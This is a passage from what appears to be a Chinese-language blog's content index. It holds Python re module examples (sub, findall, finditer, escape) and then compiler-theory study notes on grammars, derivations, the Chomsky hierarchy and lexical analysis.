Python注释</span></span><br><span class="line"><span class="keyword">print</span> (<span class="string">"电话号码是: "</span>, num)</span><br><span class="line">num = re.sub(<span class="string">r'\D'</span>, <span class="string">""</span>, phone) <span class="comment"># 删除非数字(-)的字符串</span></span><br><span class="line"><span class="keyword">print</span> (<span class="string">"电话号码是 : "</span>, num)</span><br><span class="line"></span><br><span class="line">以上实例执行结果如下：</span><br><span class="line"></span><br><span class="line">电话号码是: <span class="number">2004</span><span class="number">-959</span><span class="number">-559</span></span><br><span class="line">电话号码是 : <span class="number">2004959559</span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">以下实例中将字符串中的匹配的数字乘以 <span class="number">2</span>：</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">double</span><span class="params">(matched)</span>:</span>   <span class="comment"># 将匹配的数字乘以 2</span></span><br><span class="line">    value = int(matched.group(<span class="string">'value'</span>))</span><br><span class="line">    <span class="keyword">return</span> str(value * <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">s = <span class="string">'A23G4HFD567'</span></span><br><span class="line">print(re.sub(<span class="string">'(?P&lt;value&gt;\d+)'</span>, double, s))</span><br><span class="line"></span><br><span class="line">执行输出结果为：</span><br><span class="line">A46G8HFD1134</span><br></pre></td></tr></table></figure><ul><li><h4 id="findall"><a href="#findall" class="headerlink" title="findall()"></a>findall()</h4></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">在字符串中找到正则表达式所匹配的所有子串，并返回一个列表，如果没有找到匹配的，则返回空列表。</span><br><span class="line"></span><br><span class="line">注意： match 和 search 是匹配一次,findall 匹配所有。</span><br><span class="line"></span><br><span class="line">语法格式为：</span><br><span class="line"></span><br><span class="line">findall(string[, pos[, endpos]])</span><br><span class="line"></span><br><span class="line">参数：</span><br><span class="line"></span><br><span class="line">string: 待匹配的字符串。</span><br><span class="line">pos: 可选参数，指定字符串的起始位置，默认为 <span class="number">0</span>。</span><br><span class="line">endpos: 可选参数，指定字符串的结束位置，默认为字符串的长度。</span><br><span class="line">查找字符串中的所有数字：</span><br><span class="line"></span><br><span class="line">实例</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">pattern = re.compile(<span class="string">r'\d+'</span>) <span class="comment"># 查找数字</span></span><br><span class="line">result1 = pattern.findall(<span class="string">'runoob 123 google 456'</span>)</span><br><span class="line">result2 = pattern.findall(<span class="string">'run88oob123google456'</span>, <span class="number">0</span>, <span class="number">10</span>) <span class="comment">#取字符串之中0-10之间的数字出来</span></span><br><span class="line">print(result1，result2)</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line">[<span class="string">'123'</span>, <span class="string">'456'</span>]，[<span class="string">'88'</span>, <span class="string">'12'</span>]</span><br></pre></td></tr></table></figure><ul><li><h4 id="re-finditer"><a href="#re-finditer" class="headerlink" title="re.finditer()"></a>re.finditer()</h4></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">和 findall 类似，在字符串中找到正则表达式所匹配的所有子串，并把它们作为一个迭代器返回。</span><br><span class="line"></span><br><span class="line">re.finditer(pattern, string, flags=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">参数:</span><br><span class="line"></span><br><span class="line">pattern:匹配的正则表达式</span><br><span class="line">string:要匹配的字符串。</span><br><span class="line">flags:标志位，用于控制正则表达式的匹配方式，如：是否区分大小写，多行匹配等等。</span><br><span class="line"></span><br><span class="line">实例</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">it = re.finditer(<span class="string">r"\d+"</span>,<span class="string">"12a32bc43jf3"</span>)</span><br><span class="line"><span class="keyword">for</span> match <span class="keyword">in</span> it:</span><br><span class="line">    <span class="keyword">print</span> (match.group() )</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line"><span class="number">12</span> <span class="number">32</span> <span class="number">43</span> <span class="number">3</span></span><br></pre></td></tr></table></figure><ul><li><h4 id="re-escape"><a href="#re-escape" class="headerlink" title="re.escape()"></a>re.escape()</h4></li></ul><p>re.escape()的主要作用就是将一个字符串变成可以匹配的正则表达式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">re.escape是一个工具函数，用于对字符串中所有可能被视为正则表达式运算符的字符进行转义。使用这个函数的情况有：字符串很长，其中包含大量特殊字符，而你不想输入大量的反斜杠；你从用户那里获取了一个字符串（例如，通过函数input），想将其用于正则表达式中。下面的示例说明了这个函数的工作原理：</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>re.escape(<span class="string">'www.python.org'</span>) </span><br><span class="line"><span class="string">'www\\.python\\.org'</span> </span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>re.escape(<span class="string">'But where is the ambiguity?'</span>) </span><br><span class="line"><span class="string">'But\\ where\\ is\\ the\\ ambiuity\\?'</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> re </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Re </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Compiler</title>
      <link href="/2019/09/04/Compiler/"/>
      <url>/2019/09/04/Compiler/</url>
      
        <content type="html"><![CDATA[<h2 id="一、引论"><a href="#一、引论" class="headerlink" title="一、引论"></a>一、引论</h2><p>编译原理是良好的数学基础和好的工程结构功能的结合。</p><p>Compiler：编译，述而不作，忠于编写的东西</p><p>编译器从<strong>逻辑</strong>上可以分成若干阶段，<strong>每个阶段把源程序从一种表示变换成另一种表示</strong></p><h3 id="1-1什么叫编译程序"><a href="#1-1什么叫编译程序" class="headerlink" title="1.1什么叫编译程序"></a>1.1什么叫编译程序</h3><p>翻译器（翻译程序）：Translater</p><p>能将一种语言程序（源语言程序）转换成另一种等价的语言程序（目标语言程序）</p><p>编译器（编译程序）：Compiler</p><p>能将一种计算机高级语言程序（源语言程序）转换成另一种等价的计算机低级语言程序（目标语言程序）</p><p>解释器（解释程序）：Interpreter</p><p>也是一种翻译程序，以一种语言写的源程序作为输入，但不产生目标代码，而是边解释边执行</p><p>解释器和编译器的区别：</p><p>①编译分成两步完成：先翻译，在运行</p><p>②解释只用一步就完成：边解释边执行</p><p>可变目标编译程序（Retargetable Compiler）</p><p>交叉编译程序（Cross Compiler）</p><h3 id="1-2编译程序的组成"><a href="#1-2编译程序的组成" class="headerlink" title="1.2编译程序的组成"></a>1.2编译程序的组成</h3><p><img src="https://magic-king.net/images/loading.gif" data-original="Compiler/1.2_1.jpg" alt></p><p> 词法分析器：读入组成源程序的字符流，并将它们组织成为有意义的词素的序列</p><p>语法分析器：使用由词法分析器生成的各个词法单元的第一个分量来创建树形的中间表示，该中间表示给出了词法分析产生的词法单元流的语法结构。一个常用的表示方法便是语法树，树中的每个内部节点表示一个运算</p><p>语义分析器：使用语法树和符号表中的信息来检查源程序是否和语言定义的语义一致。同时也收集类型信息，并把这些信息存放在语法树或符号表中，以便在随后的中键代码生成过程中使用。</p><p>中间代码生成器：在把一个源程序翻译成目标代码的过程中，一个编译器可能构造出一个或多个中间表示。这些中间表示可以有多种形式。比如语法树是一种中间表示形式，通常在语法分析和语义分析中使用。</p><p>代码优化器：机器无关的代码优化步骤试图改进中间代码，以便生成更好的目标代码</p><p>代码生成器：代码生成器以源程序的中间表示形式作为输入，并把它映射到目标语言。</p><p>符号表管理器：记录源程序中使用的变量的名字，并收集和每个名字的各种属性有关的信息。</p><blockquote><p>Tips:</p><p>如何学习构造编译程序</p><p>（1）源语言，对被编译的源程序深刻理解其结构和含义</p><p>（2）目标语言，假定目标语言是机器语言，就必须搞清楚硬件的系统结构和操作系统的功能</p><p>（3）编译方法，把一种语言翻译成另一种语言的方法很多，重点</p></blockquote><h2 id="二、高级语言及其语法描述"><a href="#二、高级语言及其语法描述" class="headerlink" title="二、高级语言及其语法描述"></a>二、高级语言及其语法描述</h2><h3 id="2-1程序语言的语法和语义"><a href="#2-1程序语言的语法和语义" class="headerlink" title="2.1程序语言的语法和语义"></a>2.1程序语言的语法和语义</h3><h4 id="2-1-1语法"><a href="#2-1-1语法" class="headerlink" title="2.1.1语法"></a>2.1.1语法</h4><p>任何语言均可作一个集合。这个集合中的每个元素都是在一定符号集（字母表）上的一个符号串。</p><p>对于自然语言来说，他们是定义在某个字母表上的<strong>句子的集合</strong></p><p>对于程序语言来说，他们也是定义在某个字母表上的<strong>句子</strong>的集合。这里的句子，就是一个源程序。</p><p>词法规则：单词符号是语言中具有独立意义的最基本单位。语言的单词符号是由词法规则所确定的，即词法规则规定了单词符号的形成规则。</p><p>语法规则：上下文无关文法或BNF（Backus-Naur范式）</p><h4 id="2-1-2语义"><a href="#2-1-2语义" class="headerlink" title="2.1.2语义"></a>2.1.2语义</h4><p>语义，定义程序的意义</p><p>没有公认的形式系统描述语义</p><h3 id="2-2程序语言的一般特征"><a href="#2-2程序语言的一般特征" class="headerlink" title="2.2程序语言的一般特征"></a>2.2程序语言的一般特征</h3><h4 id="高级语言的分类"><a href="#高级语言的分类" class="headerlink" title="高级语言的分类"></a>高级语言的分类</h4><ul><li>强制性语言（Imperative Language）|过程式语言：Fortran，C，Pascal</li><li>应用式语言（Applicative Language）|函数式语言：LISP</li><li>基于规则的语言（Ruled-based Language）：Prolog</li><li>面向对象语言（Object-oriented Language）：JAVA，c++</li></ul><h3 id="2-3程序语言的语法描述"><a href="#2-3程序语言的语法描述" class="headerlink" title="2.3程序语言的语法描述"></a>2.3程序语言的语法描述</h3><h4 id="一、字母表和符号串"><a href="#一、字母表和符号串" class="headerlink" title="一、字母表和符号串"></a>一、字母表和符号串</h4><p>  <strong>字母表</strong>：符号的非空有限集合   例：∑ ={a，b，c}</p><p>  <strong>符号</strong>：字母表中的元素         例： a，b，c</p><p>  <strong>符号串</strong>：符号的有穷序列       例：a, aa, ac, abc，..</p><p>  <strong>空符号串</strong>：无任何符号的符号串( ε )    </p><p>  <strong>符号串集合</strong>：由符号串构成的集合。</p><blockquote><p><strong>符号串的形式定义</strong></p><p>   有字母表∑，定义：</p><p>  （1）ε是∑上的符号串；</p><p>  （2）若x是∑上的符号串，且<code>a∈ ∑</code>，则<code>ax</code>或<code>xa</code>是 ∑ 上的符号串；</p><p>  （3）y是∑上的符号串，iff（当且仅当）y可由（1）和（2）产生。   </p></blockquote><h4 id="二、符号串和符号串集合的运算"><a href="#二、符号串和符号串集合的运算" class="headerlink" title="二、符号串和符号串集合的运算"></a>二、符号串和符号串集合的运算</h4><p><strong>符号串相等</strong>：若x、y是集合上的两个符号串，则x＝y，iff（当且仅当）组成x的每一个符号和组成y的<strong>每一个</strong>符号依次相等。</p><p><strong>符号串的长度</strong>：若x为符号串，其长度|x|等于组成该符      号串的符号个数。（例：<code>x＝STV， |x|=3</code>）</p><p><strong>符号串的连接</strong>：若x、y是定义在Σ是上的符号串，且<code>x＝XY，y＝YX</code>，则x和y的连接 <code>xy ＝ XYYX</code>也是Σ上的符号串。（注意：一般<code>xy ≠ yx</code>，但是<code>εx = xε</code>）</p><p><strong>符号串集合的乘积运算</strong>：令A、B为符号串集合，定义<code>AB＝{ xy | x∈A, y∈B}</code></p><p><strong>符号串集合的幂运算</strong>：有符号串集合A，定义A<sup>0</sup> ={ε},  A<sup>1</sup>=A,  A<sup>2</sup>=AA,  A<sup>3</sup>=AAA,…… ……,                    A<sup>n</sup>＝A<sup>n-1</sup>A=AA<sup>n-1 </sup> ，n&gt;0</p><p><strong>符号串集合的闭包运算</strong>：设A是符号串集合，定义  A<sup>＋</sup>＝ A<sup>1</sup> ∪ A<sup>2</sup> ∪ A<sup>3</sup> ∪……∪ A<sup>n</sup> ∪……  称为集合A的正则闭包。A*＝ A<sup>0</sup> ∪A<sup>＋ </sup>称为集合A的闭包。（A<sup>0</sup> = { ε } ）</p><p><strong>为什么对符号、符号串、符号串集合以及它们的运算感兴趣？</strong></p><p>若A为某语言的基本字符集</p><p>​        A＝{a,b,……z,0,1,……,9, +,－,×,_/, ( , ), =……}</p><p>B为单词集</p><p>​     B ={begin, end, if, then,else,for,……,&lt;标识符&gt;,&lt;常量&gt;,……}</p><p>  则B ⊂  A* 。</p><p>语言的句子是定义在B上的符号串。</p><p>若令C为句子集合，则C ⊂ B<sup>*</sup>  ,  程序 ⊂ C</p><h4 id="三、文法的直观理解"><a href="#三、文法的直观理解" class="headerlink" title="三、文法的直观理解"></a>三、文法的直观理解</h4><p><strong>1.什么是文法</strong>：文法是对语言结构的定义与描述。即从形式上用于描述和规定语言结构的称为“文法”（或称为“语法”）。</p><p><strong>2.语法规则</strong>：我们通过建立一组规则（产生式），来描述句子的语法结构。规定用“<code>::=</code>”表示“由……组成“。</p><blockquote><p>例如：</p><p>&lt;句子&gt;::=&lt;主语&gt;&lt;谓语&gt;</p><p>&lt;主语&gt;::=&lt;代词&gt;|&lt;名词&gt;</p><p>&lt;代词&gt; ::=你|我|他</p><p>&lt;名词&gt;::= 王民|大学生|工人|英语</p><p>&lt;谓语&gt;::=&lt;动词&gt;&lt;直接宾语&gt;</p><p>&lt;动词&gt;::=是|学习</p><p>&lt;直接宾语&gt;::=&lt;代词&gt;|&lt;名词&gt;</p></blockquote><p><strong>3.由产生式推导句子</strong>：3.有了一组产生式之后，可以按照一定的方式用它们去推导或产生句子。</p><p>​    <strong>推导方法</strong>：从一个要识别的符号开始推导，即用相应产生式的<strong>右部</strong>来替代产生式的<strong>左部</strong>，每次仅用一条产生式去进行推导。</p><p>&lt;句子&gt;  =&gt; &lt;主语&gt;&lt;谓语&gt;</p><p>&lt;主语&gt;&lt;谓语&gt; =&gt; &lt;代词&gt;&lt;谓语&gt; </p><p>  …… ……</p><p>这种推导一直进行下去，直到所有带&lt; &gt;的符号都由终结符号替代为止。</p><blockquote><p><strong>说明</strong>：有若干语法成分同时存在时，我们总是从最左的语法成分进行推导，这称之为<strong>最左推导</strong>，类似的有<strong>最右推导</strong>（一般推导）。</p></blockquote><p><strong>文法</strong>实在<strong>形式上</strong>对句子结构的定义与描述，而未涉及<strong>语义</strong>问题</p><p><strong>4.语法树</strong></p><p>一般用语法树来描述一个句子的语法结构。</p><h4 id="四、文法和语言的形式定义"><a href="#四、文法和语言的形式定义" class="headerlink" title="四、文法和语言的形式定义"></a>四、文法和语言的形式定义</h4><h5 id="1-文法的定义"><a href="#1-文法的定义" class="headerlink" title="1.文法的定义"></a>1.文法的定义</h5><p><strong>定义1:</strong>  文法 G =（V<sub>N</sub>，V<sub>T</sub>，P，Z）</p><p>​            V<sub>N</sub> ：    非终结符号集<br>​            V<sub>T</sub> ：     终结符号集<br>​            P：        产生式或规则的集合<br>​            Z：        开始符号（识别符号）  Z∈VN</p><blockquote><ul><li>产生式：产生式是一个有序对(U, x), 通常写为:</li></ul><p>​       <code>U ::= x</code> 或<code>U ➡ x</code>；   <code>|U| = 1  |x| &gt;= 0</code></p><ul><li><p>非终结符号：出现在产生式的左部,且能推出符号或符号串的那些符号。其全体构成非终结符号集，记为V<sub>N</sub> </p></li><li><p>终结符号：不出现在产生式的左部,且不能推出符号或符号串的那些符号。其全体构成终结符号集，记为V<sub>T</sub> </p></li></ul></blockquote><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">无符号整数的文法:</span><br><span class="line">G[<span class="tag">&lt;<span class="name">无符号整数</span>&gt;</span>]=（VN，VT，P，Z）</span><br><span class="line">4VN＝&#123;<span class="tag">&lt;<span class="name">无符号整数</span>&gt;</span>, <span class="tag">&lt;<span class="name">数字串</span>&gt;</span>, <span class="tag">&lt;<span class="name">数字</span>&gt;</span>&#125;</span><br><span class="line">4VT  = &#123;0,1,2,3,4,5,6,7,8,9&#125;</span><br><span class="line">4P = &#123;<span class="tag">&lt;<span class="name">无符号整数</span>&gt;</span> → <span class="tag">&lt;<span class="name">数字串</span>&gt;</span> ;</span><br><span class="line">        <span class="tag">&lt;<span class="name">数字串</span>&gt;</span> → <span class="tag">&lt;<span class="name">数字串</span>&gt;</span> <span class="tag">&lt;<span class="name">数字</span>&gt;</span> ;</span><br><span class="line">        <span class="tag">&lt;<span class="name">数字串</span>&gt;</span> → <span class="tag">&lt;<span class="name">数字</span>&gt;</span> ;</span><br><span class="line">    <span class="tag">&lt;<span class="name">数字</span>&gt;</span> →0;    <span class="tag">&lt;<span class="name">数字</span>&gt;</span> →2; <span class="tag">&lt;<span class="name">数字</span>&gt;</span> →3;<span class="tag">&lt;<span class="name">数字</span>&gt;</span> →4;</span><br><span class="line">    <span class="tag">&lt;<span class="name">数字</span>&gt;</span> →5;    <span class="tag">&lt;<span class="name">数字</span>&gt;</span> →6;<span class="tag">&lt;<span class="name">数字</span>&gt;</span> →7;<span class="tag">&lt;<span class="name">数字</span>&gt;</span> →8;    <span class="tag">&lt;<span class="name">数字</span>&gt;</span> →9; &#125;</span><br><span class="line">4Z = <span class="tag">&lt;<span class="name">无符号整数</span>&gt;</span>;</span><br></pre></td></tr></table></figure><p>注：产生式左边符合构成集合V<sub>N</sub>，且Z ∈ V<sub>N</sub></p><p>​        有些产生式有相同的左部，可以合在一起</p><p>​        给定一个文法，实际上只需给出产生式的集合，并指定识别符号（开始符号）</p><h5 id="2-推导与归约"><a href="#2-推导与归约" class="headerlink" title="2.推导与归约"></a>2.推导与归约</h5><p><strong>定义2：</strong>直接推导：</p><p>有文法G：<code>v = xUy</code>，<code>w = xuy</code>，其中x、y∈V*，U∈V<sub>N</sub>，u∈V*，</p><p>若U ::= u∈P，则v &rArr; w，</p><p>若 x = y = ε ， 有 U ::= u， 则U &rArr; u</p><p>x和y是符号串，若使用一次产生式可以从x变换出y，则称x直接推导出y(或者说y是x的直接推导），记为x&rArr;y。</p><p><strong>定义3：</strong> <code>+</code>推导：x和y是符号串，若使用若干次产生式可以从x变换出y，则称x推导出y(或者说y是x的推导），记为x  =<sup>+</sup>=&rArr;y。</p><p>即，若有直接推导序列：x=U0==&gt;U1==&gt;U2==&gt;……==&gt;Un=y,则 x=<sup>+</sup>=&gt;y 。</p><p> <strong>定义4：</strong><code>*</code>推导：x和y是符号串，若使用0次或若干次产生式可以从x变换出y，则称x<em>推导出y(或者说y是x的</em>推导），记为x=<sup>*</sup>=&gt;y。</p><p>如：N=<sup>*</sup>=&gt;N， N=<sup>*</sup>=&gt;109</p><p><strong>定义5：</strong>最右推导&amp;最左推导</p><ul><li><p><strong>最右推导</strong>：若符号串α中有两个以上的非终结符时，对推导的每一步坚持把α中的最右非终结符进行替换，称为最右推导。</p></li><li><p><strong>最左推导</strong>：若符号串α中有两个以上的非终结符时，对推导的每一步坚持把α中的最左非终结符进行替换，称为最左推导。</p></li></ul><p><strong>！！！规范推导＝最右推导</strong></p><p><strong>定义6：</strong>推导的逆过程为归约</p><p>x==&gt;y，可称为x直接推导出y，也可称为y直接归约出x</p><h5 id="3-语言的形式定义"><a href="#3-语言的形式定义" class="headerlink" title="3.语言的形式定义"></a>3.语言的形式定义</h5><p><strong>定义7：</strong>文法G[Z]</p><p>​            （1）<strong>句型</strong>：x是句型 &hArr; Z =<sup>*</sup>=&gt;x,且 x∈V<sup>*</sup>；</p><p>​            （2）<strong>句子</strong>：x是句子 &hArr; Z =<sup>+</sup>=&gt; x, 且 x∈V<sub>T</sub><sup>*</sup>；</p><p>​            （3）<strong>语言</strong>：L（G[Z]）={x| Z=<sup>+</sup>=&gt;x， x∈V<sub>T</sub><sup>*</sup> }；（文法G[z]产生的所有句子的集合）</p><p><strong>定义8：</strong>G和G’是两个不同的文法，若L(G) = L(G’)，则G和G’为<strong>等价文法</strong></p><p>编译感兴趣的问题如下</p><p>给定终极符x，文法G，求x ∈ L(G)？</p><p><img src="https://magic-king.net/images/loading.gif" data-original="Compiler/2.jpg" alt="编译感兴趣的问题"></p><p><strong>4.文法分类</strong></p><ul><li>形式语言：用文法和自动机所描述的没有语义的语言</li></ul><p>语言定义： L(G[Z]) = { x | Z=<sup>+</sup>=&gt;x，x∈V<sub>T</sub><sup>*</sup> }</p><p>文法定义：乔姆斯基将所有文法定义为一个<strong>四元组</strong>：G = （V<sub>N</sub>，V<sub>T</sub>，P，Z）</p><blockquote><p>V<sub>N</sub> ：    非终结符号集<br>V<sub>T</sub> ：     终结符号集<br>P：        产生式或规则的集合<br>Z：        开始符号（识别符号）  Z∈VN</p></blockquote><p>文法和语言的分类：0型、1型、2型、3型</p><p><strong>定义9：</strong> 0型文法</p><blockquote><p>P： u  &rarr; v ，其中 u ∈ V<sup>+</sup>，v ∈ V<sup>*</sup></p><p>0型文法称为<strong>短语结构文法</strong>。产生式的左部和右部都可以是符号串，一个短语可以产生另一个短语。</p><p>0型语言：L0，这种语言可以用<strong>图灵机（Turing）</strong>接受</p></blockquote><p><strong>定义10：</strong>1型文法</p><blockquote><p>P： xUy &rarr; xuy ，其中 U ∈V<sub>N</sub>，x、y、u ∈ V<sup>*</sup></p><p>1型文法称为<strong>上下文有关</strong>或上下文敏感。即只有在x、y这样的上下文中才能将U改写为u</p><p>1型语言：L1，这种语言可以有一种<strong>线性界限自动机</strong>接受</p></blockquote><p><strong>定义11：</strong>2型文法</p><blockquote><p>P： U &rarr; u ，其中 U ∈ V<sub>N</sub> ，u ∈ V<sup>*</sup></p><p>2型文法称为<strong>上下文无关文法</strong>。即把U改写为u时，不必考虑上下文。</p><p>注意：2型文法与BNF表示相等价。</p><p>2型语言：L2，这种语言可以由<strong>下推自动机</strong>接受</p></blockquote><p><strong>定义12：</strong>3型文法</p><blockquote><p>（左线型） P： U &rarr; T | U &rarr; wT ，其中 U、w ∈ V<sub>N</sub> ，T ∈ V<sub>T</sub> </p><p>（右线性）P： U &rarr; T | U &rarr; Tw ，其中 U、w ∈ V<sub>N</sub> ，T ∈ V<sub>T</sub> </p><p>3型文法称为<strong>正则文法</strong>。它是对2型文法进行进一步的限制</p><p>3型语言：L3，又称正则语言、正则集合，这种语言可以由<strong>有穷自动机</strong>接受</p></blockquote><p>由上易知， L0 &sup; L1 &sup; L2 &sup; L3</p><p>0型文法可以产生L0、L1、L2、L3，但2型文法只能产生L2，不能产生L1</p><h5 id="5-语法树与二义性文法"><a href="#5-语法树与二义性文法" class="headerlink" title="5.语法树与二义性文法"></a>5.语法树与二义性文法</h5><p>1.推导与语法树</p><p>语法树：句子结构的图示表示法，通常表示称一棵倒立的树，即</p><blockquote><p>结点：        符号</p><p>根节点：    识别符号</p><p>中间节点：非终结符</p><p>叶节点：    终结符<del>或非终结符</del></p><p>边：表示节点间的派生关系</p></blockquote><p>句型的推导及语法树的生成（自顶向下）</p><p>给定G[Z]，句型w：可建立推导序列，Z =<sup>*</sup>=&gt; w；可建立语法树，以Z为树根节点，每步推导生成语法树的一枝，最终可生成句型的语法树。</p><p>语法树的生成规律不同，但最终生成的语法树形状完全相同</p><p>一般推导</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">graph TB</span><br><span class="line">4A[&lt;无符号整数&gt;] --&gt; B[&lt;数字串&gt;]</span><br><span class="line">4B --&gt; C[&lt;数字串&gt;]</span><br><span class="line">4B --&gt; D[&lt;数字&gt;]</span><br><span class="line">4C --&gt; E[&lt;数字&gt;]</span><br><span class="line">4E --&gt; F[1]</span><br><span class="line">4D --&gt; G[0]</span><br></pre></td></tr></table></figure><p><img src="https://magic-king.net/images/loading.gif" data-original="Compiler\8.jpg" alt></p><p>树与推导：句型推导过程 &hArr; 句型语法树的生长过程</p><p>①由推导构造语法树</p><p>从<strong>识别符号</strong>开始，<strong>自左向右</strong>建立<strong>推导</strong>序列 &rArr; 由<strong>根节点</strong>开始，<strong>自上而下</strong>建立<strong>语法树</strong></p><p>②由语法树构造推导</p><p><strong>自叶而根</strong>修剪子树的末端节点，直至把整棵树剪掉（留根），每剪一次对应一次归约 &rArr; 从句型开始，<strong>自右向左</strong>地逐步进行<strong>归约</strong>，建立推导序列</p><p>2.文法的二义性</p><p><strong>定义：</strong>若对于一个文法的某一句子存在两棵不同的语法树，则该文法是<strong>二义性文法</strong>，否则是无二义性文法</p><p>换而言之，无二义性文法的句子<strong>只有一棵语法树</strong>，尽管推导过程可以不同</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">比如二义性文法: G[<span class="keyword">E</span>]:<span class="keyword">E</span> := <span class="keyword">E</span>+<span class="keyword">E</span> | <span class="keyword">E</span>*<span class="keyword">E</span> | (<span class="keyword">E</span>) | i</span><br><span class="line">44444Vn = &#123;E&#125;</span><br><span class="line">44444VT = &#123;+,*,(,),i&#125;</span><br><span class="line"></span><br><span class="line">针对 i+i*i 有两种不同的语法树</span><br></pre></td></tr></table></figure><p><strong>定义：</strong>若一个文法的某句子存在两个不同的<strong>规范推导（最右推导）</strong>，则该文法是<strong>二义性</strong>的，否则是无二义性的</p><blockquote><p>若文法是二义性的，则在编译时就会产生不确定性，遗憾的是在理论上已经证明：文法的二义性是不可判定的，即不可能构造出一个算法，通过有限步骤来判定任一文法是否有二义性</p><p>现在的解决办法是：提出一些限制条件，称为无二义性的充分条件，当文法满足这些条件时，就可以判定文法是无二义性的。</p><p>由于无二义性文法比较简单，我们也可以采用另一种解决办法：即不改变二义性文法，而是确定一种编译算法，使该算法满足无二义性充分条件。</p></blockquote><p>句柄：句型的句柄是和某产生式右部匹配的子串。句柄是直接短语，即某产生式的右部，具有最左性</p><p>若句柄不存在重复，就说明文法无二义性</p><p>如 S &rarr; ABC ，ABC为该句子的句柄</p><h2 id="三、词法分析"><a href="#三、词法分析" class="headerlink" title="三、词法分析"></a>三、词法分析</h2><ul><li>词法分析 （Lexical Analysis） </li></ul><p>实现词法分析器的程序称为词法分析程序（扫描器）</p><p>词法分析程序的<strong>主要任务</strong>：对构成源程序的字符串<strong>从左到右的扫描</strong>，<strong>逐个字符地</strong>读入源程序字符并按照构词规则切分成一个一个具有独立意义的单词。并确定其属性（如保留字、标识符、运算符、界限符和常量等）。再把它们转换成长度统一的标准形式——属性字（TOKEN）。</p><p>词法分析是编译过程中的第一个阶段，在语法分析前进行。也可以和语法分析结合在一起作为一遍，由语法分析程序调用词法分析程序来获得当前单词供语法分析使用。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">graph LR</span><br><span class="line">4A[源程序] --&gt; B[词法分析程序]</span><br><span class="line">4B -- Token --&gt; C[语法分析程序]</span><br><span class="line">4C -- get token --&gt; B</span><br></pre></td></tr></table></figure><p><img src="https://magic-king.net/images/loading.gif" data-original="Compiler\9.jpg" alt></p><blockquote><p>为什么将词法分析工作从语法分析工作中独立出来？</p><ul><li><p>简化设计</p></li><li><p>改进编译效率</p></li><li><p>增加编译系统的可移植性</p></li></ul></blockquote><h3 id="3-1-词法分析器的要求"><a href="#3-1-词法分析器的要求" class="headerlink" title="3.1 词法分析器的要求"></a>3.1 词法分析器的要求</h3><ul><li><strong>功能：输入源程序，输出单词符号</strong></li></ul><p><strong>单词符号是一个程序语言的基本语法符号</strong></p><ul><li><strong>单词的分类</strong>：</li></ul><blockquote><p>1.<strong>关键字：</strong>由程序语言定义的具有固定意义的标识符。也称为保留字或基本字</p><p>2.<strong>标识符：</strong>用来表示程序中各种名字的字符串。</p><p>3.<strong>常    数：</strong>常数的类型一般有整型、实型、布尔型、文字型。</p><p>4.<strong>运算符：</strong>如+、－ 、*、/ 